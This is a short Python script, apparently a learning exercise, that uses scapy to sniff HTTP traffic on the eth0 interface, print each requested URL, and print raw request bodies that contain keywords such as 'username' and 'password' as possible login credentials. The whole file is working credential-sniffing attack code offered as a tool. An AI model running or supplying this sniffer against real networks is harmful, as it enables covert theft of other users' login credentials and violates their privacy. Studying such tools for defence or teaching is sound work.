#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import re
"""capture url and possible password on http """

def sniff(interface):
    scapy.sniff(iface=interface,store=False, prn=packet_Capt)
                #filter="port 80")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def packet_Capt(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        print("[+] Url = {}".format(get_url(packet)))

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #print(packet[scapy.Raw].load)
            keywords = ["user","username","pass,","password","login"]
            for key in keywords:
                if key in load:
                    print("\n\n[*] Possible login/pass : {}".format(load))
                    break
sniff("eth0")
